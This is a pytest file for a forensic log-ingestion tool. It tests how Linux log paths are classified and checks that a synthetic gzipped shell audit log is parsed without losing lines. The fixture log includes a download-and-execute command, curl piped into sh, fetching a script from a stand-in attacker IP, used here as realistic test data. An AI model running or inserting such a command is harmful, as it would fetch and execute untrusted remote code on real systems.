"""A folder of logs uploaded as it is: every log is read, and no line of a shell audit log is lost.
All content is synthetic."""
from __future__ import annotations

import gzip
from pathlib import Path

import pytest

from app.ingest.linux.dispatch import parse_linux_artifact_file
from app.ingest.linux.helpers import looks_like_linux_artifact


@pytest.mark.parametrize("path, family", [
    ("logs/app.log", "linux_generic_log"),
    ("logs/dmesg", "linux_generic_log"),
    ("collector/log/ns.log.3.gz", "linux_generic_log"),
    ("export/LOGS/service.out", "linux_generic_log"),
    ("logs/nginx/access.log.3.gz", "linux_apache"),
    ("export/log/httpd/access_log-20240101.gz", "linux_apache"),
    ("logs/sh.log.2.gz", "linux_shell_history"),
])
def test_logs_in_a_log_folder_are_recognised(path, family):
    assert looks_like_linux_artifact(path)[0] == family


@pytest.mark.parametrize("path", [
    "C/Windows/Logs/CBS/CBS.log",
    "Windows/System32/LogFiles/Firewall/pfirewall.log",
    "Users/bob/AppData/Local/vendor/logs/app.log",
    "ProgramData/vendor/logs/service.log",
    "C/inetpub/logs/LogFiles/W3SVC1/u_ex240101.log",
    "random/app.log",
    "logs/report.pdf",
    "logs/data.json",
])
def test_windows_layouts_and_files_outside_log_folders_are_left_alone(path):
    found = looks_like_linux_artifact(path)
    assert found is None or found[0] != "linux_generic_log"


SH_LOG = (
    'Oct  2 09:00:00 <local7.notice> ns sh[2000]: nsroot on /dev/pts/1 shell_command="uname -a"\n'
    "Oct  2 09:00:05 <local7.notice> ns sh[2000]: (nsroot) CMD (curl -s http://203.0.113.9/x.sh | sh)\n"
    "Oct  2 09:00:09 <local7.info> ns newsyslog[1]: logfile turned over\n"
    "sh: /tmp/.x: Permission denied\n"
)


def test_no_line_of_a_shell_audit_log_is_dropped(tmp_path: Path):
    path = tmp_path / "sh.log.0.gz"
    path.write_bytes(gzip.compress(SH_LOG.encode()))
    rows = parse_linux_artifact_file(path, parser="linux_shell_raw_bsd_audit", artifact_type="bsd_shell_audit", source_path="log/sh.log.0.gz")
    assert len(rows) == 4
    assert rows[0]["command"] == "uname -a"
    assert "curl -s http://203.0.113.9/x.sh | sh" in rows[1]["message"] and rows[1]["timestamp"] is not None
    assert rows[1]["process"] == "sh" and rows[2]["process"] == "newsyslog"
    assert rows[3]["timestamp"] is None and rows[3]["message"] == "sh: /tmp/.x: Permission denied"
